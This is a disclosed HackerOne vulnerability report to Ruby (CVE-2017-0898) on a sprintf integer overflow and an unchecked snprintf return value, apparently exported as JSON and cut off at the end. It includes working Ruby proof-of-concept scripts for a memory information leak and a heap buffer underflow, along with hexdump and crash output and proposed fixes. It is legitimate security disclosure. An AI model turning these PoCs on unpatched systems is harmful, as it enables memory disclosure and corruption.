{"id":212241,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIyNDE=","url":"https://hackerone.com/reports/212241","title":"sprintf combined format string attack","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-10T11:48:41.167Z","submitted_at":"2017-03-10T11:48:41.167Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0898"],"singular_disclosure_disabled":false,"disclosed_at":"2017-09-22T00:05:00.297Z","bug_reporter_agreed_on_going_public_at":"2017-09-19T04:57:24.435Z","team_member_agreed_on_going_public_at":"2017-09-22T00:05:00.253Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In a ticket that was also reported to \"shopify-scripts\" regarding \"MRuby\", I reported in details a combined attack against the sprintf gem:\n* Information leak\n* Heap buffer underflow\n\nThe full ticket details can be found in:\n* Ticket #212239\n* The ticked was opened several minutes ago (but I add it in case it will be handled fast enough to be available to you too), and here are the details:\n\nThis ticket is somehow connected to Ticket #211190, that suggested another fix to the ```CHECK(l)``` macro. The attached code assumed that the ticket will be fixed like it was fixed in MRuby, however the vulnerabilities apply even without the fix, that was aimed at another vulnerability.\n\nTechnical Error 1:\n==============\nThe ```CHECK(l)``` macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:\n```cpp\n#define CHECK(l) do {\\\n/*  int cr = ENC_CODERANGE(result);*/\\\n  while ((l) \u003e= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n/*  ENC_CODERANGE_SET(result, cr);*/\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n```\nOne example for reaching a negative \"l\" value is in the \"G\" format when the width is \"2 ** 31 - 20\", causing need to be ```MIN_INT```:\n```cpp\n        if ((flags\u0026FWIDTH) \u0026\u0026 need \u003c width)\n            need = width;\n        need += 20;\n\n        CHECK(need);\n        n = snprintf(\u0026buf[blen], need, fbuf, fval);\n        blen += n;\n```\nProposed Fix:\n--------------------\nSince there are several such IOFs, the best fix will be a robust check inside the macro itself.\nThe macro should add another check to raise an exception in case ```l \u003c 0```.\n\nTechnical Error 2:\n==============\nStill in the \"G\" format, in case of a huge width, the snprintf call will fail, returning -1:\n```cpp\n        n = snprintf(\u0026buf[blen], need, fbuf, fval);\n        blen += n;\n```\nThis means that we can decrement blen by 1 for each such format primitive.\nInformation Leak PoC Script:\n```ruby\nsecret_password = \"thisismysuperdupersecretpassword\"\n\nf = 1234567890.12345678\nunique = sprintf(\"% 2147483628G\", f)\n\nsample1 = \"1\" * 50\nsample2 = \"2\" * 100\nsample3 = \"3\" * 200\n\nprint unique.length\nprint unique\n```\nOn 32bit machines, the ```mrb_str_resize(-1)``` will create a string of length -1 with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:\n```\nhexdump sprintf_leak.bin\n0000000 312d 0000 0000 0000 0000 0000 0000 0000\n0000010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000080 0000 0000 0000 0039 0000 3131 3131 3131\n0000090 3131 3131 3131 3131 3131 3131 3131 3131\n*\n00000b0 3131 3131 3131 3131 3131 3131 0000 0071\n00000c0 0000 3232 3232 3232 3232 3232 3232 3232\n00000d0 3232 3232 3232 3232 3232 3232 3232 3232\n*\n0000120 3232 3232 3232 0000 0000 0000 0000 00d1\n0000130 0000 3333 3333 3333 3333 3333 3333 3333\n0000140 3333 3333 3333 3333 3333 3333 3333 3333\n*\n00001f0 3333 3333 3333 3333 3333 0000 0000 05c9\n0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8\n0000210 095d 0000 0000 0000 0000 0000 0000 0000\n0000220 0000 0000 0000 0000 0000 0000 0000 0000\n*\n00007c0 0000 05c8 0000 0010 0000 001b 0000 0001\n00007d0 0000 e048 095d 0029 0000 6874 7369 7369\n00007e0 796d 7573 6570 6472 7075 7265 6573 7263\n00007f0 7465 6170 7373 6f77 6472 0000 0000 0021\n0000800 0000 0810 0000 e2c0 0959 0000 0000 0020\n0000810 0000 e0f0 095d f200 095d 0000 0000 0029\n0000820 0000 6874 7369 7369 796d 7573 6570 6472\n0000830 7075 7265 6573 7263 7465 6170 7373 6f77\n0000840 6472 0000 0000 0019 0000 2025 3132 3734\n0000850 3834 3633 3832 0047 0000 0000 0000 0021\n0000860 0000 0810 0000 e2c0 0959 0000 0000 000d\n0000870 0000 e108 095d f260 095d 0000 0000 0019\n0000880 0000 2025 3132 3734 3834 3633 3832 0047\n0000890 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008a0 0959 0000 0000 0031 0000 0000 0000 0000\n00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008c0 0959 0000 0000 0032 0000 0000 0000 0000\n00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008e0 0959 0000 0000 0033 0000 0000 0000 0000\n00008f0 0000 0000 0000 dd31 0001 0000 0000 0000\n0000900 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0001000\n```\nAnd a close look will tell us that:\n* The print of unique.length returned -1: 0x2d, 0x31\n*  Our \"secret password\" can be found at the last memory block of the dump.\n\nHeap buffer underflow PoC Script:\n--------------------------------------------------\n```ruby\nf = 1234567890.12345678\nformat = \"% 2147483628G\" * 10 + \"!!!!!!!!!!!\"\n\nstr1 = \"1\" * 120\nunique = sprintf(format, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f)\nprint str1\n```\nDecrementing ```blen``` 10 times, will result in a buffer underflow of 10 bytes, that will write '!' on the str1, as can be seen in the dump:\n```\n*** Error in `./mruby': double free or corruption (out): 0x09905b30 ***\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]\n/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]\n/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]\n./mruby[0x804c81b]\n./mruby[0x80593f5]\n./mruby[0x8052760]\n./mruby[0x805a3a0]\n./mruby[0x80596bb]\n./mruby[0x80596f8]\n./mruby[0x804ce4d]\n./mruby[0x8049762]\n./mruby[0x8049c48]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]\n./mruby[0x80491d1]\n======= Memory map: ========\n08048000-080ed000 r-xp 00000000 08:01 2883651    /XXX/mruby/bin/mruby\n080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby\n080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby\n098c0000-09924000 rw-p 00000000 00:00 0          [heap]\nb7300000-b7321000 rw-p 00000000 00:00 0 \nb7321000-b7400000 ---p 00000000 00:00 0 \nb7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74c8000-b74c9000 rw-p 00000000 00:00 0 \nb74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767c000-b767f000 rw-p 00000000 00:00 0 \nb767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76e9000-b76ec000 rw-p 00000000 00:00 0 \nb76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]\nb76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]\nb76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7711000-b7712000 rw-p 00000000 00:00 0 \nb7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nbff43000-bff64000 rw-p 00000000 00:00 0          [stack]\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)\n```\nProposed Fix:\n--------------------\nShould check the return value of ```snprintf ``` for errors, instead of directly using it by adding it to ```blen```.","vulnerability_information_html":"\u003cp\u003eIn a ticket that was also reported to \u0026quot;shopify-scripts\u0026quot; regarding \u0026quot;MRuby\u0026quot;, I reported in details a combined attack against the sprintf gem:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eInformation leak\u003c/li\u003e\n\u003cli\u003eHeap buffer underflow\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe full ticket details can be found in:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eTicket \u003ca href=\"/reports/212239\"\u003e#212239\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eThe ticked was opened several minutes ago (but I add it in case it will be handled fast enough to be available to you too), and here are the details:\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis ticket is somehow connected to Ticket \u003ca href=\"/reports/211190\"\u003e#211190\u003c/a\u003e, that suggested another fix to the \u003ccode\u003eCHECK(l)\u003c/code\u003e macro. The attached code assumed that the ticket will be fixed like it was fixed in MRuby, however the vulnerabilities apply even without the fix, that was aimed at another vulnerability.\u003c/p\u003e\n\n\u003ch1 id=\"technical-error-1\"\u003eTechnical Error 1:\u003c/h1\u003e\n\n\u003cp\u003eThe \u003ccode\u003eCHECK(l)\u003c/code\u003e macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e#define CHECK(l) do {\\\n\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*  int cr = ENC_CODERANGE(result);*/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\\\n  while ((l) \u0026gt;= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*  ENC_CODERANGE_SET(result, cr);*/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOne example for reaching a negative \u0026quot;l\u0026quot; value is in the \u0026quot;G\u0026quot; format when the width is \u0026quot;2 ** 31 - 20\u0026quot;, causing need to be \u003ccode\u003eMIN_INT\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eFWIDTH\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003eCHECK\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esnprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efval\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblen\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"proposed-fix\"\u003eProposed Fix:\u003c/h2\u003e\n\n\u003cp\u003eSince there are several such IOFs, the best fix will be a robust check inside the macro itself.\u003cbr\u003e\nThe macro should add another check to raise an exception in case \u003ccode\u003el \u0026lt; 0\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"technical-error-2\"\u003eTechnical Error 2:\u003c/h1\u003e\n\n\u003cp\u003eStill in the \u0026quot;G\u0026quot; format, in case of a huge width, the snprintf call will fail, returning -1:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e        \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esnprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efval\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblen\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis means that we can decrement blen by 1 for each such format primitive.\u003cbr\u003e\nInformation Leak PoC Script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003esecret_password\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;thisismysuperdupersecretpassword\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1234567890.12345678\u003c/span\u003e\n\u003cspan class=\"n\"\u003eunique\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;% 2147483628G\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003esample1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e50\u003c/span\u003e\n\u003cspan class=\"n\"\u003esample2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\n\u003cspan class=\"n\"\u003esample3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;3\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eunique\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003elength\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eunique\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn 32bit machines, the \u003ccode\u003emrb_str_resize(-1)\u003c/code\u003e will create a string of length -1 with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehexdump sprintf_leak.bin\n0000000 312d 0000 0000 0000 0000 0000 0000 0000\n0000010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000080 0000 0000 0000 0039 0000 3131 3131 3131\n0000090 3131 3131 3131 3131 3131 3131 3131 3131\n*\n00000b0 3131 3131 3131 3131 3131 3131 0000 0071\n00000c0 0000 3232 3232 3232 3232 3232 3232 3232\n00000d0 3232 3232 3232 3232 3232 3232 3232 3232\n*\n0000120 3232 3232 3232 0000 0000 0000 0000 00d1\n0000130 0000 3333 3333 3333 3333 3333 3333 3333\n0000140 3333 3333 3333 3333 3333 3333 3333 3333\n*\n00001f0 3333 3333 3333 3333 3333 0000 0000 05c9\n0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8\n0000210 095d 0000 0000 0000 0000 0000 0000 0000\n0000220 0000 0000 0000 0000 0000 0000 0000 0000\n*\n00007c0 0000 05c8 0000 0010 0000 001b 0000 0001\n00007d0 0000 e048 095d 0029 0000 6874 7369 7369\n00007e0 796d 7573 6570 6472 7075 7265 6573 7263\n00007f0 7465 6170 7373 6f77 6472 0000 0000 0021\n0000800 0000 0810 0000 e2c0 0959 0000 0000 0020\n0000810 0000 e0f0 095d f200 095d 0000 0000 0029\n0000820 0000 6874 7369 7369 796d 7573 6570 6472\n0000830 7075 7265 6573 7263 7465 6170 7373 6f77\n0000840 6472 0000 0000 0019 0000 2025 3132 3734\n0000850 3834 3633 3832 0047 0000 0000 0000 0021\n0000860 0000 0810 0000 e2c0 0959 0000 0000 000d\n0000870 0000 e108 095d f260 095d 0000 0000 0019\n0000880 0000 2025 3132 3734 3834 3633 3832 0047\n0000890 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008a0 0959 0000 0000 0031 0000 0000 0000 0000\n00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008c0 0959 0000 0000 0032 0000 0000 0000 0000\n00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008e0 0959 0000 0000 0033 0000 0000 0000 0000\n00008f0 0000 0000 0000 dd31 0001 0000 0000 0000\n0000900 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0001000\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd a close look will tell us that:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe print of unique.length returned -1: 0x2d, 0x31\u003c/li\u003e\n\u003cli\u003e Our \u0026quot;secret password\u0026quot; can be found at the last memory block of the dump.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"heap-buffer-underflow-poc-script\"\u003eHeap buffer underflow PoC Script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1234567890.12345678\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;% 2147483628G\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;!!!!!!!!!!!\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e120\u003c/span\u003e\n\u003cspan class=\"n\"\u003eunique\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecrementing \u003ccode\u003eblen\u003c/code\u003e 10 times, will result in a buffer underflow of 10 bytes, that will write \u0026#39;!\u0026#39; on the str1, as can be seen in the dump:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e*** Error in `./mruby\u0026#39;: double free or corruption (out): 0x09905b30 ***\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]\n/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]\n/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]\n./mruby[0x804c81b]\n./mruby[0x80593f5]\n./mruby[0x8052760]\n./mruby[0x805a3a0]\n./mruby[0x80596bb]\n./mruby[0x80596f8]\n./mruby[0x804ce4d]\n./mruby[0x8049762]\n./mruby[0x8049c48]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]\n./mruby[0x80491d1]\n======= Memory map: ========\n08048000-080ed000 r-xp 00000000 08:01 2883651    /XXX/mruby/bin/mruby\n080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby\n080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby\n098c0000-09924000 rw-p 00000000 00:00 0          [heap]\nb7300000-b7321000 rw-p 00000000 00:00 0 \nb7321000-b7400000 ---p 00000000 00:00 0 \nb7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74c8000-b74c9000 rw-p 00000000 00:00 0 \nb74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767c000-b767f000 rw-p 00000000 00:00 0 \nb767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76e9000-b76ec000 rw-p 00000000 00:00 0 \nb76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]\nb76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]\nb76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7711000-b7712000 rw-p 00000000 00:00 0 \nb7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nbff43000-bff64000 rw-p 00000000 00:00 0          [stack]\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"proposed-fix\"\u003eProposed Fix:\u003c/h2\u003e\n\n\u003cp\u003eShould check the return value of \u003ccode\u003esnprintf\u003c/code\u003e for errors, instead of directly using it by adding it to \u003ccode\u003eblen\u003c/code\u003e.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":2,"name":"Memory Corruption - 